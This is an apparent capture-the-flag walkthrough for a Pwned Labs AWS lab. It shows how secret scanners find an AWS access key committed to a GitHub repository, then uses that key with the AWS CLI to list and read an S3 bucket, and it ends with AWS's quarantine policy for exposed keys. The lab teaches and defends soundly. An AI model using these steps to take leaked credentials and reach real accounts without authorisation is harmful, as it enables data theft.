---
title: Hunt for Secrets in Git Repos
description: Hunt for Secrets in Git Repos
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
While conducting OSINT on a lesser-known dark web forum as part of assessing your client's threat landscape, you stumble upon a thread discussing high-value targets. Among the chaos of links and boasts, a user casually mentions discovering an intriguing GitHub repository belonging to your client, the international titan, Huge Logistics. A couple of underground researchers hint at having found something but remain cryptic. Your instincts tell you there's more to uncover. Your objective? Dive deep into this repository, trace any associated infrastructure, and uncover any vulnerabilities before they become tomorrow's headline. The clock is ticking. Will you outsmart the adversaries?

# Walkthrough
We are given repository `https://github.com/huge-logistics/cargo-logistics-dev`. We can clone it and review the material, but since the lab's goal is to show the impact of leaked credentials in git repositories, we can use tools to detect sensitive data:
- [https://github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks)
- [https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)
- [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)
- etc.

Let's check `gitleaks`. We can start with `dir` option. The result seems to be `False Positive`
```
└─$ gitleaks dir -v 

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     ...dException', ], ], 'authtype' => 'v4-unsigned-body', ], 'PostText' => [...
Secret:      v4-unsigned-body
RuleID:      generic-api-key
Entropy:     3.625000
File:        vendor/aws/aws-sdk-php/src/data/runtime.lex/2016-11-28/api-2.json.php
Line:        3
Fingerprint: vendor/aws/aws-sdk-php/src/data/runtime.lex/2016-11-28/api-2.json.php:generic-api-key:3

12:06AM INF scanned ~12952109 bytes (12.95 MB) in 335ms
12:06AM WRN leaks found: 1

```

Let's now check `git` option. And we have hits for AWS keys and one false positive
```
└─$ gitleaks git -v

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     'key'    => "AKIAWHEOTHRFSGQITLIY",
Secret:      AKIAWHEOTHRFSGQITLIY
RuleID:      aws-access-token
Entropy:     3.784184
File:        log-s3-test/log-upload.php
Line:        10
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:aws-access-token:10
Link:        https://github.com/huge-logistics/cargo-logistics-dev/blob/d8098af5fbf1aa35ae22e99b9493ffae5d97d58f/log-s3-test/log-upload.php#L10

Finding:     'secret' => "<REDACTED>"
Secret:      <REDACTED>
RuleID:      generic-api-key
Entropy:     4.853056
File:        log-s3-test/log-upload.php
Line:        11
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:generic-api-key:11
Link:        https://github.com/huge-logistics/cargo-logistics-dev/blob/d8098af5fbf1aa35ae22e99b9493ffae5d97d58f/log-s3-test/log-upload.php#L11

Finding:     ...dException', ], ], 'authtype' => 'v4-unsigned-body', ], 'PostText' => [...
Secret:      v4-unsigned-body
RuleID:      generic-api-key
Entropy:     3.625000
File:        vendor/aws/aws-sdk-php/src/data/runtime.lex/2016-11-28/api-2.json.php
Line:        3
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:vendor/aws/aws-sdk-php/src/data/runtime.lex/2016-11-28/api-2.json.php:generic-api-key:3
Link:        https://github.com/huge-logistics/cargo-logistics-dev/blob/d8098af5fbf1aa35ae22e99b9493ffae5d97d58f/vendor/aws/aws-sdk-php/src/data/runtime.lex/2016-11-28/api-2.json.php#L3

12:07AM INF 4 commits scanned.
12:07AM INF scanned ~12969156 bytes (12.97 MB) in 448ms
12:07AM WRN leaks found: 3

```

We can confirm it with `git` command
```
└─$ git show d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php
<?php

// Include the SDK using the composer autoloader
require 'vendor/autoload.php';

$s3 = new Aws\S3\S3Client([
        'region'  => 'us-east-1',
        'version' => 'latest',
        'credentials' => [
            'key'    => "AKIAWHEOTHRFSGQITLIY",
            'secret' => "<REDACTED>",
        ]
]);

// Send a PutObject request and get the result object.
$key = 'transact.log';

$result = $s3->putObject([
        'Bucket' => 'huge-logistics-transact',
        'Key'    => $key,
        'SourceFile' => 'transact.log'
]);

// Print the body of the result by indexing into the result object.
var_dump($result);

?>

```

Now, let's check `trufflehog`. One way is to perform scan on git repo remotely via `trufflehog git https://github.com/huge-logistics/cargo-logistics-dev` command. But since we cloaned it, we can just do the following
```
└─$ trufflehog git file://./ --regex --no-entropy
<SNIP>
                                                                                                                                                                                                                
✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAWHEOTHRFSGQITLIY
Resource_type: Access key
Account: 427648302155
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
User_id: AIDAWHEOTHRF24EMR3SXJ
Arn: arn:aws:iam::427648302155:user/dev-test
Commit: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Email: Ian Austin <iandaustin@outlook.com>
File: log-s3-test/log-upload.php
Line: 10
Repository: https://github.com/huge-logistics/cargo-logistics-dev
Timestamp: 2023-07-04 17:49:13 +0000                 
```

We see the old finding `d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php`. But there are some strings, which automated tools can miss, thus it is a good practice to also perform manual search
```
└─$ grep -R "mysqli_connect" . 2> /dev/null
./Backend/include/DB.php:$Connection = mysqli_connect("localhost","root","<REDACTED>","");
./status.php://$Connection = mysqli_connect('localhost','theunite_neeraj', '',) or die("No Connection"); 
```

Let's authenticate by using leaked secrets. We can see that we are `dev-test` user
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRF24EMR3SXJ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/dev-test"
}

```

If we list bucket that we found in `d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php`, and we see our flag and sensitive data
```
└─$ aws s3 ls s3://huge-logistics-transact
2023-07-05 21:53:50         32 flag.txt
2023-07-04 23:15:47          5 transact.log
2023-07-05 21:57:36      51968 web_transactions.csv

```

We can copy everyting using `aws s3 cp s3://huge-logistics-transact . --recursive`. But in our case we just need one file to be printed (flag.txt for examle):
```
└─$ aws s3 cp s3://huge-logistics-transact/flag.txt -   
<REDACTED> 
```

There's a nice article [What to Do If You Inadvertently Expose an AWS Access Key](https://aws.amazon.com/blogs/security/what-to-do-if-you-inadvertently-expose-an-aws-access-key/) that worth reading. AWS attaches `AWSCompromisedKeyQuarantineV2` policy to leaked secrets when detected/notified. The policy denies access to a range of higher risk activities such as creating and deleting resources
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Deny",
            "Action": [
                "cloudtrail:LookupEvents",
                "ec2:RequestSpotInstances",
                "ec2:RunInstances",
                "ec2:StartInstances",
                "iam:AddUserToGroup",
                "iam:AttachGroupPolicy",
                "iam:AttachRolePolicy",
                "iam:AttachUserPolicy",
                "iam:ChangePassword",
                "iam:CreateAccessKey",
                "iam:CreateInstanceProfile",
                "iam:CreateLoginProfile",
                "iam:CreatePolicyVersion",
                "iam:CreateRole",
                "iam:CreateUser",
                "iam:DetachUserPolicy",
                "iam:PassRole",
                "iam:PutGroupPolicy",
                "iam:PutRolePolicy",
                "iam:PutUserPermissionsBoundary",
                "iam:PutUserPolicy",
                "iam:SetDefaultPolicyVersion",
                "iam:UpdateAccessKey",
                "iam:UpdateAccountPasswordPolicy",
                "iam:UpdateAssumeRolePolicy",
                "iam:UpdateLoginProfile",
                "iam:UpdateUser",
                "lambda:AddLayerVersionPermission",
                "lambda:AddPermission",
                "lambda:CreateFunction",
                "lambda:GetPolicy",
                "lambda:ListTags",
                "lambda:PutProvisionedConcurrencyConfig",
                "lambda:TagResource",
                "lambda:UntagResource",
                "lambda:UpdateFunctionCode",
                "lightsail:Create*",
                "lightsail:Delete*",
                "lightsail:DownloadDefaultKeyPair",
                "lightsail:GetInstanceAccessDetails",
                "lightsail:Start*",
                "lightsail:Update*",
                "organizations:CreateAccount",
                "organizations:CreateOrganization",
                "organizations:InviteAccountToOrganization",
                "s3:DeleteBucket",
                "s3:DeleteObject",
                "s3:DeleteObjectVersion",
                "s3:PutLifecycleConfiguration",
                "s3:PutBucketAcl",
                "s3:PutBucketOwnershipControls",
                "s3:DeleteBucketPolicy",
                "s3:ObjectOwnerOverrideToBucketOwner",
                "s3:PutAccountPublicAccessBlock",
                "s3:PutBucketPolicy",
                "s3:ListAllMyBuckets",
                "ec2:PurchaseReservedInstancesOffering",
                "ec2:AcceptReservedInstancesExchangeQuote",
                "ec2:CreateReservedInstancesListing",
                "savingsplans:CreateSavingsPlan"
            ],
            "Resource": [
                "*"
            ]
        }
    ]
}
```